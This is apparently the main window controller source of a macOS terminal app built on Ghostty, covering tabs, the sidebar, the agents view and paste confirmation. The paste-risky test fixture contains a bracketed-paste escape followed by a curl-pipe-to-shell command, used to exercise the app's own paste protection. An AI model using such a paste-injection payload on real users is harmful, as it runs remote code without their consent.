import AppKit
import Combine
import GhosttyKit
import UserNotifications

/// Our surface: it reports every user write path into the pty, so the core can retire a request the user
/// may already have answered at the terminal. A subclass, so the vendored Ghostty sources stay unpatched;
/// Ghostty's own bindings that it handles in performKeyEquivalent also arrive here through keyDown.
/// libghostty has no single write choke point the app can hook, so each entry is overridden; see docs/core-api.md.
final class HauntSurfaceView: Ghostty.SurfaceView {
    var onInput: (() -> Void)?
    /// A paste that Ghostty's paste protection holds for confirmation; nil when it resolves or is replaced.
    var onPasteConfirmation: ((Ghostty.ClipboardConfirmationRequest?) -> Void)?
    /// A paste Haunt holds itself (PastePreview.needsConfirmation); the host asks, then calls `sendPaste`.
    var onRiskyPaste: ((String) -> Void)?

    /// True when `text` was held for confirmation instead of going to Ghostty.
    private func holdIfRisky(_ text: String?) -> Bool {
        guard let text, let ask = onRiskyPaste, PastePreview(text).needsConfirmation else { return false }
        ask(text)
        return true
    }

    /// Writes a paste the user confirmed, exactly the text they saw.
    func sendPaste(_ text: String) {
        onInput?()
        surfaceModel?.sendText(text)
    }

    override func keyDown(with event: NSEvent) {
        onInput?()
        super.keyDown(with: event)
    }

    override func paste(_ sender: Any?) {
        onInput?()
        if holdIfRisky(NSPasteboard.general.getOpinionatedStringContents()) { return }
        super.paste(sender)
    }

    override func pasteAsPlainText(_ sender: Any?) {
        onInput?()
        if holdIfRisky(NSPasteboard.general.getOpinionatedStringContents()) { return }
        super.pasteAsPlainText(sender)
    }

    override func pasteSelection(_ sender: Any?) {
        onInput?()
        if holdIfRisky(NSPasteboard.ghosttySelection.getOpinionatedStringContents()) { return }
        super.pasteSelection(sender)
    }

    /// IME commits, the Character Viewer and dictation can insert text without a keyDown.
    override func insertText(_ string: Any, replacementRange: NSRange) {
        onInput?()
        super.insertText(string, replacementRange: replacementRange)
    }

    /// Middle click pastes the selection clipboard.
    private var middleHeld = false

    override func otherMouseDown(with event: NSEvent) {
        if event.buttonNumber == 2 {
            onInput?()
            middleHeld = holdIfRisky(NSPasteboard.ghosttySelection.getOpinionatedStringContents())
            if middleHeld { return }
        }
        super.otherMouseDown(with: event)
    }

    override func otherMouseUp(with event: NSEvent) {
        // A press held back with its paste keeps its release too.
        if event.buttonNumber == 2, middleHeld {
            middleHeld = false
            return
        }
        super.otherMouseUp(with: event)
    }

    override func performDragOperation(_ sender: any NSDraggingInfo) -> Bool {
        onInput?()
        if holdIfRisky(sender.draggingPasteboard.getOpinionatedStringContents()) { return true }
        return super.performDragOperation(sender)
    }

    /// Services such as "Send to Terminal" write the pasteboard straight into the pty.
    override func readSelection(from pboard: NSPasteboard) -> Bool {
        onInput?()
        if holdIfRisky(pboard.getOpinionatedStringContents()) { return true }
        return super.readSelection(from: pboard)
    }

    /// A confirmed paste writes when its request resolves, possibly long after the paste action itself.
    /// The request's outcome is private, so retire on every resolution, including a cancel.
    override var pendingClipboardConfirmation: Ghostty.ClipboardConfirmationRequest? {
        didSet {
            guard oldValue !== pendingClipboardConfirmation else { return }
            if let old = oldValue, old.kind == .paste { onInput?() }
            let new = pendingClipboardConfirmation
            onPasteConfirmation?(new?.kind == .paste ? new : nil)
        }
    }
}

/// One sidebar row: a libghostty surface registered with the core.
final class Tab {
    let env: SurfaceEnv
    let view: Ghostty.SurfaceView
    /// Ghostty's scroll wrapper; it is what tells the surface its size.
    let host: SurfaceScrollView
    var subscriptions: [AnyCancellable] = []
    /// Bumped per info report, so a slow branch lookup never overwrites a newer one.
    var infoGeneration = 0

    init(env: SurfaceEnv, view: Ghostty.SurfaceView, size: CGSize) {
        self.env = env
        self.view = view
        host = SurfaceScrollView(contentSize: size, surfaceView: view)
    }
}

/// Lays out title bar, sidebar and pane at fixed mockup sizes; without the sidebar, mockup 10's.
private final class RootView: NSView {
    let titleBar = TitleBarView()
    let sidebar = SidebarView()
    let pane = NSView()
    /// The palette mockup's scrim over everything below the title bar.
    let scrim = NSView()
    let agents = AgentsView()

    var sidebarHidden = false {
        didSet {
            titleBar.zen = sidebarHidden
            sidebar.isHidden = sidebarHidden || agentsOn
            needsLayout = true
        }
    }

    /// The agents-only view covers the window; the panes keep their last frames so no terminal resizes.
    var agentsOn = false {
        didSet {
            agents.isHidden = !agentsOn
            titleBar.isHidden = agentsOn
            pane.isHidden = agentsOn
            sidebar.isHidden = agentsOn || sidebarHidden
            needsLayout = true
        }
    }

    override var isFlipped: Bool { true }

    override init(frame: NSRect) {
        super.init(frame: frame)
        pane.wantsLayer = true
        pane.layer?.backgroundColor = Tok.Color.windowBg.cgColor
        scrim.wantsLayer = true
        scrim.layer?.backgroundColor = NSColor(white: 0, alpha: Tok.Size.paletteScrimAlpha).cgColor
        scrim.isHidden = true
        agents.isHidden = true
        for v in [titleBar, sidebar, pane, scrim, agents] { addSubview(v) }
    }

    required init?(coder: NSCoder) { fatalError() }

    override func layout() {
        super.layout()
        agents.frame = bounds
        if agentsOn { return }
        let top = TitleBarView.height(zen: sidebarHidden), w = sidebarHidden ? 0 : Tok.Size.sidebarW
        titleBar.frame = NSRect(x: 0, y: 0, width: bounds.width, height: top)
        sidebar.frame = NSRect(x: 0, y: top, width: Tok.Size.sidebarW, height: bounds.height - top)
        pane.frame = NSRect(x: w, y: top, width: bounds.width - w, height: bounds.height - top)
        scrim.frame = NSRect(x: 0, y: top, width: bounds.width, height: bounds.height - top)
        for v in pane.subviews { v.frame = pane.bounds }
    }
}

final class MainWindowController: NSWindowController, NSWindowDelegate {
    private let core: CoreAPI
    private let ghostty: Ghostty.App
    private let fixture: Fixture?
    private let config: HauntConfig
    /// Set once the core has started, so the decision log is loaded before plugins read it.
    var plugins: PluginsAPI?
    private lazy var palette: PaletteController = {
        let p = PaletteController(host: self)
        p.sticky = fixture != nil
        return p
    }()
    private let root = RootView()
    private(set) var tabs: [Tab] = []
    private var selectedId: String?
    private var refreshQueued = false
    private var observers: [NSObjectProtocol] = []
    private var ticker: Timer?
    /// Applied in showWindow, once the window has its launch position to restore to.
    private var agentsViewAtLaunch = false
    private lazy var listener = MainQueueListener { [weak self] in self?.coalescedRefresh() }

    init(core: CoreAPI, ghostty: Ghostty.App, fixture: Fixture?, config: HauntConfig) {
        self.core = core
        self.ghostty = ghostty
        self.fixture = fixture
        self.config = config
        let size = Fixture.windowSize
        let win = NSWindow(contentRect: NSRect(origin: .zero, size: size),
                           styleMask: [.titled, .closable, .miniaturizable, .resizable, .fullSizeContentView],
                           backing: .buffered, defer: false)
        // Hidden in the title bar; still names the window in the Window menu and to accessibility.
        win.title = "Haunt"
        win.titleVisibility = .hidden
        win.titlebarAppearsTransparent = true
        win.colorSpace = .sRGB
        win.appearance = NSAppearance(named: .darkAqua)
        win.backgroundColor = Tok.Color.windowBg
        win.minSize = NSSize(width: Tok.Size.sidebarW + 300, height: 240)
        win.tabbingMode = .disallowed
        for b in [NSWindow.ButtonType.closeButton, .miniaturizeButton, .zoomButton] {
            win.standardWindowButton(b)?.isHidden = true
        }
        win.contentView = root
        super.init(window: win)
        win.delegate = self

        root.titleBar.accessory = fixture?.titleAccessory ?? .icons
        root.titleBar.onIcon = { [weak self] icon in self?.titleIcon(icon) }
        root.titleBar.onHint = { [weak self] hint in
            switch hint {
            case .agents: self?.toggleSidebar()
            case .search: self?.togglePalette()
            }
        }
        // Fixtures neither read nor overwrite the user's saved state.
        root.sidebarHidden = fixture?.sidebarHidden ?? config.loadState().sidebarHidden
        agentsViewAtLaunch = fixture?.agentsView ?? config.loadState().agentsView
        updateKeys(config.keys)
        root.titleBar.buttons = fixture?.titlebarButtons ?? config.titlebarButtons
        root.sidebar.onSelect = { [weak self] id in self?.select(id) }
        root.sidebar.onClose = { [weak self] id in self?.closeTab(id) }
        root.agents.list.onSelect = { [weak self] id in self?.expandAgentsView(to: id) }
        root.agents.list.onClose = { [weak self] id in self?.closeTab(id) }
        root.sidebar.onRename = { [weak self] id, name in
            self?.customNames[id] = name.isEmpty ? nil : name
            self?.refresh()
        }
        root.sidebar.onRenameEnd = { [weak self] in self?.focusSelectedSurface() }
        root.sidebar.rowMenu = { [weak self] id in self?.plugins?.rowMenuItems(surfaceId: id) ?? [] }
        root.sidebar.onRowMenu = { [weak self] item, id in self?.invokeRowMenuItem(item, surfaceId: id) }
        root.sidebar.onRowMoved = { [weak self] id, group, before in
            self?.plugins?.rowMoved(surfaceId: id, groupId: group, beforeSurfaceId: before)
        }
        core.setListener(listener: listener)

        let nc = NotificationCenter.default
        observers.append(nc.addObserver(forName: Ghostty.Notification.ghosttyCloseSurface, object: nil, queue: .main) { [weak self] n in
            guard let view = n.object as? Ghostty.SurfaceView else { return }
            self?.surfaceWantsClose(view, processAlive: n.userInfo?["process_alive"] as? Bool ?? false)
        })
    }

    required init?(coder: NSCoder) { fatalError() }

    func tab(for view: Ghostty.SurfaceView) -> Tab? { tabs.first { $0.view === view } }

    // MARK: Tabs

    func newTab(cwd: String? = nil, select selectIt: Bool = true) {
        guard let app = ghostty.app else { return }
        let dir = cwd ?? tabs.first { $0.env.surfaceId == selectedId }?.view.pwd ?? NSHomeDirectory()
        // The core refuses past its surface cap; no tab beats an unverifiable one.
        guard let env = try? core.registerSurface(cwd: dir) else { NSSound.beep(); return }
        var config = Ghostty.SurfaceConfiguration()
        config.workingDirectory = dir
        config.environmentVariables = [
            "HAUNT": "1",
            "HAUNT_SURFACE_ID": env.surfaceId,
            "HAUNT_HOOK_NONCE": env.nonce,
            "HAUNT_SOCK": env.socketPath,
        ]
        if let fixture = fixtureCommand() { config.command = fixture }
        let view = HauntSurfaceView(app, baseConfig: config, uuid: nil)
        // Before the keystroke reaches the pty, so a late Allow/Deny can't be typed into a running tool.
        view.onInput = { [weak self] in self?.core.onUserInput(surfaceId: env.surfaceId) }
        view.onPasteConfirmation = { [weak self, weak view] req in
            if let view { self?.confirmPaste(req, on: view) }
        }
        view.onRiskyPaste = { [weak self, weak view] text in
            guard let self, let view else { return }
            self.askPaste(PasteAsk(view: view, text: text, request: nil) { [weak view] ok in
                if ok { view?.sendPaste(text) }
            })
        }
        // So the surface starts at the pane's real size.
        root.layoutSubtreeIfNeeded()
        let tab = Tab(env: env, view: view, size: root.pane.bounds.size)
        tab.subscriptions.append(view.$title.combineLatest(view.$pwd)
            .debounce(for: .milliseconds(50), scheduler: DispatchQueue.main)
            .sink { [weak self] title, pwd in self?.reportInfo(tab, title: title, pwd: pwd ?? dir) })
        tabs.append(tab)
        tab.host.frame = root.pane.bounds
        tab.host.isHidden = true
        root.pane.addSubview(tab.host)
        if selectIt || selectedId == nil { select(env.surfaceId) } else { syncFocus() }
    }

    // MARK: Paste confirmation

    /// One paste waiting for the user. `request` is Ghostty's, when it raised the question; it can be
    /// withdrawn (replaced or cleared) before the sheet is answered.
    private struct PasteAsk {
        weak var view: HauntSurfaceView?
        let text: String
        let request: Ghostty.ClipboardConfirmationRequest?
        let finish: (Bool) -> Void
    }

    /// One sheet at a time per window; asks from other surfaces wait their turn.
    private var pasteQueue: [PasteAsk] = []
    private var pasteShown: (ask: PasteAsk, alert: NSAlert)?

    /// Ghostty's paste protection asks before an unsafe paste; nil withdraws what this surface had asked.
    private func confirmPaste(_ request: Ghostty.ClipboardConfirmationRequest?, on view: HauntSurfaceView) {
        let stale = { (a: PasteAsk) in a.view === view && a.request != nil && a.request !== request }
        pasteQueue.removeAll(where: stale)
        if let shown = pasteShown, stale(shown.ask) || shown.ask.view == nil {
            pasteShown = nil
            window?.endSheet(shown.alert.window, returnCode: .abort)
        }
        if let request {
            askPaste(PasteAsk(view: view, text: request.contents, request: request) { [weak view] ok in
                if ok { request.complete() } else { request.cancel() }
                if view?.pendingClipboardConfirmation === request { view?.pendingClipboardConfirmation = nil }
            })
        }
        showNextPaste()
    }

    private func askPaste(_ ask: PasteAsk) {
        pasteQueue.append(ask)
        showNextPaste()
    }

    private func showNextPaste() {
        guard pasteShown == nil, let window else { return }
        pasteQueue.removeAll { $0.view == nil }
        guard !pasteQueue.isEmpty else { return }
        let ask = pasteQueue.removeFirst()
        if let view = ask.view, let tab = tab(for: view), tab.env.surfaceId != selectedId { select(tab.env.surfaceId) }
        let alert = Self.pasteAlert(ask.text)
        pasteShown = (ask, alert)
        alert.beginSheetModal(for: window) { [weak self] r in
            guard let self, self.pasteShown?.alert === alert else { return }
            self.pasteShown = nil
            ask.finish(r == .alertSecondButtonReturn)
            // The next sheet can't begin until this one has finished ending.
            DispatchQueue.main.async { self.showNextPaste() }
        }
    }

    /// The whole paste, read-only and scrollable, with every control character spelled out (PastePreview).
    /// Cancel is the default; pasting takes an explicit click.
    static func pasteAlert(_ text: String) -> NSAlert {
        let preview = PastePreview(text)
        let alert = NSAlert()
        alert.messageText = preview.lines == 1 ? "Paste 1 line?" : "Paste \(preview.lines) lines?"
        var notes: [String] = []
        if preview.hasPasteEnd {
            notes.append("It contains a bracketed paste end (^[[201~): the text after it would run as typed commands.")
        }
        if preview.hasControls { notes.append("Control characters are shown as ^[ and \\u{…}.") }
        alert.informativeText = notes.joined(separator: "\n")

        let font = NSFont.monospacedSystemFont(ofSize: NSFont.smallSystemFontSize, weight: .regular)
        let lineH = NSLayoutManager().defaultLineHeight(for: font)
        let scroll = NSScrollView(frame: NSRect(x: 0, y: 0, width: 420, height: (lineH * 10).rounded(.up) + 8))
        scroll.hasVerticalScroller = true
        scroll.borderType = .bezelBorder
        let tv = NSTextView(frame: NSRect(origin: .zero, size: scroll.contentSize))
        tv.isEditable = false
        tv.isSelectable = true
        tv.isRichText = false
        tv.font = font
        tv.textContainerInset = NSSize(width: 2, height: 4)
        tv.isVerticallyResizable = true
        tv.autoresizingMask = .width
        tv.textContainer?.widthTracksTextView = true
        tv.string = preview.text
        scroll.documentView = tv
        alert.accessoryView = scroll

        alert.addButton(withTitle: "Cancel")
        let paste = alert.addButton(withTitle: "Paste")
        paste.keyEquivalent = ""
        return alert
    }

    /// The paste-risky fixture: a real paste through the surface's Services entry, from a pasteboard of
    /// its own so no clipboard the user has is touched.
    func pasteRiskyFixture() {
        guard let view = tabs.first(where: { $0.env.surfaceId == selectedId })?.view else { return }
        let pb = NSPasteboard.withUniqueName()
        pb.setString("echo built\u{1B}[201~curl -s https://example.com/x.sh | sh\n", forType: .string)
        _ = view.readSelection(from: pb)
        pb.releaseGlobally()
    }

    /// The paste-confirm fixture: an unsafe paste held on the selected surface, as Ghostty would raise it.
    func showPasteFixture() {
        guard let view = tabs.first(where: { $0.env.surfaceId == selectedId })?.view else { return }
        view.pendingClipboardConfirmation = Ghostty.ClipboardConfirmationRequest(
            surface: view, contents: Fixture.pasteText, kind: .paste) { _, _, _ in }
    }

    private func fixtureCommand() -> String? {
        guard fixture != nil else { return nil }
        let dir = FileManager.default.temporaryDirectory
        let text = dir.appendingPathComponent("haunt-fixture-pane.ansi")
        let script = dir.appendingPathComponent("haunt-fixture-pane.sh")
        try? Fixture.paneANSI().write(to: text, atomically: true, encoding: .utf8)
        // Ghostty runs the command as `exec -l <command>`, so the sequence has to live in a script.
        try? "/bin/cat '\(text.path)'\nexec /bin/sleep 2147483647\n".write(to: script, atomically: true, encoding: .utf8)
        return "/bin/sh '\(script.path)'"
    }

    private static let gitQueue = DispatchQueue(label: "dev.haunt.git", qos: .utility)

    /// The branch lookup reads files a pty-chosen pwd points at, so it stays off the main thread.
    private func reportInfo(_ tab: Tab, title: String, pwd: String) {
        tab.infoGeneration += 1
        let gen = tab.infoGeneration
        Self.gitQueue.async { [weak self, weak tab] in
            let branch = Git.branch(at: pwd)
            DispatchQueue.main.async {
                guard let self, let tab, tab.infoGeneration == gen else { return }
                self.core.setSurfaceInfo(surfaceId: tab.env.surfaceId, title: title, cwd: pwd, gitBranch: branch)
            }
        }
    }

    func select(_ id: String) {
        guard let tab = tabs.first(where: { $0.env.surfaceId == id }) else { return }
        selectedId = id
        core.selectSurface(surfaceId: id)
        // Every surface stays in the window (hidden when not selected) so its size and display stay current.
        for t in tabs { t.host.isHidden = t !== tab }
        window?.makeFirstResponder(root.agentsOn ? root.agents : tab.view)
        syncFocus()
    }

    /// Like Ghostty's own controller: only the selected surface of the key window has focus. Ghostty learns
    /// the display only on screen changes, so it is told up front for its vsync display link.
    /// Only the selected surface of a visible window renders; the rest are occluded.
    private func syncFocus() {
        let key = window?.isKeyWindow ?? false
        let display = window?.screen?.displayID
        let paneShown = (window?.occlusionState.contains(.visible) ?? false) && !root.agentsOn
        for t in tabs {
            let selected = t.env.surfaceId == selectedId
            t.view.focusDidChange(key && selected && t.view.isFirstResponder)
            guard let surface = t.view.surface else { continue }
            ghostty_surface_set_occlusion(surface, paneShown && selected)
            if let display { ghostty_surface_set_display_id(surface, display) }
            if selected { ghostty_surface_refresh(surface) }
        }
    }

    /// ⌘1–9 follow the sidebar's display order.
    func select(index: Int) {
        let ids = root.sidebar.orderedIds
        if ids.indices.contains(index) { select(ids[index]) }
    }

    /// Next (+1) or previous (-1) tab in sidebar order, wrapping around.
    func selectAdjacent(_ step: Int) {
        let ids = root.sidebar.orderedIds
        guard !ids.isEmpty else { return }
        let i = selectedId.flatMap(ids.firstIndex(of:)) ?? 0
        select(ids[((i + step) % ids.count + ids.count) % ids.count])
    }

    func closeSelectedTab() {
        if let id = selectedId { closeTab(id) }
    }

    /// Like ⌘W on that tab: Ghostty asks for confirmation when a process is running.
    func closeTab(_ id: String) {
        guard let surface = tabs.first(where: { $0.env.surfaceId == id })?.view.surface else { return }
        ghostty.requestClose(surface: surface)
    }

    private func surfaceWantsClose(_ view: Ghostty.SurfaceView, processAlive: Bool) {
        guard let tab = tab(for: view), let window else { return }
        guard processAlive else { return remove(tab) }
        let alert = NSAlert()
        alert.messageText = "Close this tab?"
        alert.informativeText = "A process is still running in it."
        alert.addButton(withTitle: "Close")
        alert.addButton(withTitle: "Cancel")
        alert.beginSheetModal(for: window) { [weak self] r in
            if r == .alertFirstButtonReturn { self?.remove(tab) }
        }
    }

    private func remove(_ tab: Tab) {
        guard let i = tabs.firstIndex(where: { $0 === tab }) else { return }
        let order = root.sidebar.orderedIds
        let pos = order.firstIndex(of: tab.env.surfaceId)
        tab.subscriptions.removeAll()
        tab.host.removeFromSuperview()
        tabs.remove(at: i)
        customNames[tab.env.surfaceId] = nil
        core.unregisterSurface(surfaceId: tab.env.surfaceId)
        guard !tabs.isEmpty else {
            window?.close()
            return
        }
        if selectedId == tab.env.surfaceId {
            let rest = order.filter { $0 != tab.env.surfaceId }
            let next = pos.map { rest[min($0, rest.count - 1)] } ?? tabs[0].env.surfaceId
            select(next)
        }
        refresh()
    }

    // MARK: Core

    /// A burst of hook events becomes one redraw.
    private func coalescedRefresh() {
        guard !refreshQueued else { return }
        refreshQueued = true
        DispatchQueue.main.async { [weak self] in
            self?.refreshQueued = false
            self?.refresh()
            self?.drainPluginRequests()
        }
    }

    /// Subagent elapsed times are computed in snapshot(), so poll once a second to keep them ticking,
    /// but only while the window can be seen; becoming visible again catches up at once.
    private func updateTicker() {
        let visible = window?.occlusionState.contains(.visible) ?? false
        guard visible != (ticker != nil) else { return }
        ticker?.invalidate()
        ticker = nil
        guard visible else { return }
        refresh()
        let t = Timer(timeInterval: 1, repeats: true) { [weak self] _ in
            self?.refresh()
            self?.drainPluginRequests()
        }
        t.tolerance = 0.2
        RunLoop.main.add(t, forMode: .common)
        ticker = t
    }

    /// Names given with Rename Tab, for the life of the tab. They replace only the row title.
    private var customNames: [String: String] = [:]

    func refresh() {
        var snap = core.snapshot()
        if !customNames.isEmpty {
            for g in snap.groups.indices {
                for r in snap.groups[g].rows.indices {
                    if let n = customNames[snap.groups[g].rows[r].surfaceId] { snap.groups[g].rows[r].name = n }
                }
            }
        }
        if snap != root.sidebar.snapshot { root.sidebar.snapshot = snap }
        if root.agentsOn { root.agents.update(snap) }
        let sel = snap.groups.lazy.flatMap(\.rows).first { $0.selected }
        root.titleBar.progress = sel?.progress.map { $0.total == 0 ? 0 : CGFloat($0.done) / CGFloat($0.total) }
    }

    // MARK: Sidebar, palette, keys

    var isSidebarHidden: Bool { root.sidebarHidden }

    var onSidebarToggle: (() -> Void)?

    var isRenaming: Bool { root.sidebar.isRenaming }

    func renameSelectedTab(text: String? = nil) {
        guard let id = selectedId else { return }
        if root.sidebarHidden { toggleSidebar() }
        root.sidebar.beginRename(id, text: text)
    }

    func setCustomName(_ name: String, at index: Int) {
        let ids = root.sidebar.orderedIds
        guard ids.indices.contains(index) else { return }
        customNames[ids[index]] = name
        refresh()
    }

    func toggleSidebar() {
        root.sidebarHidden.toggle()
        onSidebarToggle?()
        root.layoutSubtreeIfNeeded()
        if fixture == nil {
            var state = config.loadState()
            state.sidebarHidden = root.sidebarHidden
            config.saveState(state)
        }
    }

    /// The zen hint and anything else that shows a shortcut follow the `[keys]` table.
    func updateKeys(_ keys: KeyMap) {
        func hint(_ a: KeyMap.Action, _ word: String) -> String {
            keys[a].map { "\($0.display) \(word)" } ?? word
        }
        root.titleBar.hints = [(.agents, hint(.toggleSidebar, "agents")), (.search, hint(.palette, "search"))]
        root.titleBar.shortcuts = Dictionary(uniqueKeysWithValues: TitlebarButton.allCases.compactMap { b in keys[b.action].map { (b, $0.display) } })
        root.agents.shortcut = AgentsView.mockupDisplay(keys[.agentsView])
    }

    func updateTitlebarButtons(_ buttons: [TitlebarButton]) {
        root.titleBar.buttons = buttons
    }

    func togglePalette() {
        if palette.isOpen { return palette.close() }
        // The 400 pt palette doesn't fit the 278 pt strip.
        if root.agentsOn { return NSSound.beep() }
        openPalette()
    }

    func openPalette(text: String = "") {
        guard let window else { return }
        root.scrim.isHidden = false
        palette.open(over: window, top: TitleBarView.height(zen: root.sidebarHidden) + Tok.Size.paletteTop, text: text)
    }

    func paletteFixtureSelectNext() { palette.edit(.down) }

    /// Writes bytes the core handed back for a surface, as `ghostty_surface_text` does for typed text.
    private func write(_ bytes: Data, to surfaceId: String) {
        guard !bytes.isEmpty, let surface = tabs.first(where: { $0.env.surfaceId == surfaceId })?.view.surface else { return }
        bytes.withUnsafeBytes { buf in
            guard let p = buf.baseAddress?.assumingMemoryBound(to: CChar.self) else { return }
            ghostty_surface_text(surface, p, UInt(buf.count))
        }
    }

    // MARK: Plugins

    /// `.notify` becomes a macOS notification; a `.ptyAnswer` is written only as the bytes the core's gate returns.
    func drainPluginRequests() {
        guard let plugins else { return }
        for req in plugins.takeRequests() {
            switch req {
            case let .notify(pluginId, title, body, _, _):
                Self.notify(pluginId: pluginId, title: title, body: body)
            case .ptyAnswer:
                guard let w = core.gatePluginRequest(request: req) else { continue }
                write(w.bytes, to: w.surfaceId)
            }
        }
    }

    private static var askedNotifications = false

    private static func notify(pluginId: String, title: String, body: String) {
        let center = UNUserNotificationCenter.current()
        let post = {
            let content = UNMutableNotificationContent()
            content.title = title
            // Names the plugin, so a plugin can't pass its notification off as Haunt's own.
            content.subtitle = pluginId
            content.body = body
            center.add(UNNotificationRequest(identifier: UUID().uuidString, content: content, trigger: nil))
        }
        guard !askedNotifications else { return post() }
        askedNotifications = true
        center.requestAuthorization(options: [.alert, .sound]) { granted, _ in if granted { post() } }
    }

    /// The core keeps running without its socket; agent rows then only get OSC status.
    func showStartError(_ error: Error) {
        guard let window else { return }
        let alert = NSAlert()
        alert.messageText = "Haunt can't receive agent events"
        alert.informativeText = "The hook socket didn't start: \(error). Agent rows will only show basic status."
        alert.beginSheetModal(for: window)
    }


    // MARK: Title bar

    private func titleIcon(_ icon: TitleBarView.Icon) {
        switch icon {
        case .search: togglePalette()
        case .newTab: newTab()
        case .settings: (NSApp.delegate as? AppDelegate)?.openSettings(nil)
        case .sidebar: toggleSidebar()
        }
    }

    // MARK: Agents-only view

    var isAgentsViewOn: Bool { root.agentsOn }

    override func showWindow(_ sender: Any?) {
        if agentsViewAtLaunch {
            agentsViewAtLaunch = false
            setAgentsView(true, animate: false)
        }
        super.showWindow(sender)
    }

    func toggleAgentsView() {
        setAgentsView(!root.agentsOn, animate: true)
        if fixture == nil {
            var state = config.loadState()
            state.agentsView = root.agentsOn
            config.saveState(state)
        }
    }

    /// A row click: the full window comes back on that tab.
    private func expandAgentsView(to id: String) {
        if root.agentsOn { toggleAgentsView() }
        select(id)
    }

    private func setAgentsView(_ on: Bool, animate: Bool) {
        guard let window, on != root.agentsOn else { return }
        if window.styleMask.contains(.fullScreen) { return NSSound.beep() }
        if on {
            if palette.isOpen { palette.close() }
            root.agents.restore = (window.frame, window.minSize)
            root.agentsOn = true
            refresh()
            window.minSize = NSSize(width: Tok.Size.narrowW - 2, height: 200)
            let frame = AgentsView.dockedFrame(on: window.screen ?? NSScreen.main, height: fixture.map { _ in Fixture.narrowHeight })
            window.setFrame(frame, display: true, animate: animate)
            window.makeFirstResponder(root.agents)
        } else {
            // Grow first, then lay the panes out once at their full size.
            if let r = root.agents.restore {
                window.setFrame(r.frame, display: true, animate: animate)
                window.minSize = r.minSize
            }
            root.agents.restore = nil
            root.agentsOn = false
            root.layoutSubtreeIfNeeded()
            if let tab = tabs.first(where: { $0.env.surfaceId == selectedId }) { window.makeFirstResponder(tab.view) }
        }
        syncFocus()
    }

    // MARK: NSWindowDelegate

    func windowShouldClose(_ sender: NSWindow) -> Bool {
        guard ghostty.needsConfirmQuit else { return true }
        let alert = NSAlert()
        alert.messageText = "Close the window?"
        alert.informativeText = "Processes are still running in its tabs."
        alert.addButton(withTitle: "Close")
        alert.addButton(withTitle: "Cancel")
        alert.beginSheetModal(for: sender) { r in
            if r == .alertFirstButtonReturn { sender.close() }
        }
        return false
    }

    func windowDidBecomeKey(_ notification: Notification) { syncFocus() }
    func windowDidResignKey(_ notification: Notification) { syncFocus() }
    func windowDidChangeScreen(_ notification: Notification) { syncFocus() }
    func windowDidChangeOcclusionState(_ notification: Notification) {
        updateTicker()
        syncFocus()
    }

    func windowDidResize(_ notification: Notification) {
        guard palette.isOpen, let window else { return }
        palette.position(over: window, top: TitleBarView.height(zen: root.sidebarHidden) + Tok.Size.paletteTop)
    }

    func windowWillClose(_ notification: Notification) {
        ticker?.invalidate()
        ticker = nil
        for t in tabs { core.unregisterSurface(surfaceId: t.env.surfaceId) }
        tabs.removeAll()
    }
}

extension MainWindowController: PaletteHost {
    var paletteTabs: [Row] {
        let order = root.sidebar.orderedIds
        let rows = Dictionary(root.sidebar.snapshot.groups.flatMap(\.rows).map { ($0.surfaceId, $0) }, uniquingKeysWith: { a, _ in a })
        return order.compactMap { rows[$0] }
    }

    var selectedSurfaceId: String? { selectedId }

    var palettePlugins: PluginsAPI? { plugins }

    var pluginLoadErrors: [String] { plugins?.loadErrors() ?? [] }

    func paletteSelectTab(_ surfaceId: String) { select(surfaceId) }

    func paletteInvoke(pluginId: String, itemId: String) {
        do {
            try plugins?.invokePaletteItem(pluginId: pluginId, itemId: itemId)
        } catch {
            AppDelegate.logger.error("plugin \(pluginId, privacy: .public) item \(itemId, privacy: .public): \(String(describing: error), privacy: .public)")
            NSSound.beep()
        }
        drainPluginRequests()
    }

    func invokeRowMenuItem(_ item: RowMenuItem, surfaceId: String) {
        do {
            try plugins?.invokeRowMenuItem(pluginId: item.pluginId, itemId: item.id, surfaceId: surfaceId)
        } catch {
            AppDelegate.logger.error("plugin \(item.pluginId, privacy: .public) row item \(item.id, privacy: .public): \(String(describing: error), privacy: .public)")
            NSSound.beep()
        }
        drainPluginRequests()
    }

    var paletteKeys: KeyMap { config.keys }

    var isFullScreen: Bool { window?.styleMask.contains(.fullScreen) ?? false }

    func paletteRun(_ action: KeyMap.Action) { (NSApp.delegate as? AppDelegate)?.performMenuItem(action) }

    func paletteDidClose() {
        root.scrim.isHidden = true
        window?.makeKeyAndOrderFront(nil)
        focusSelectedSurface()
    }

    private func focusSelectedSurface() {
        guard let window else { return }
        if let tab = tabs.first(where: { $0.env.surfaceId == selectedId }) { window.makeFirstResponder(tab.view) }
        syncFocus()
    }
}
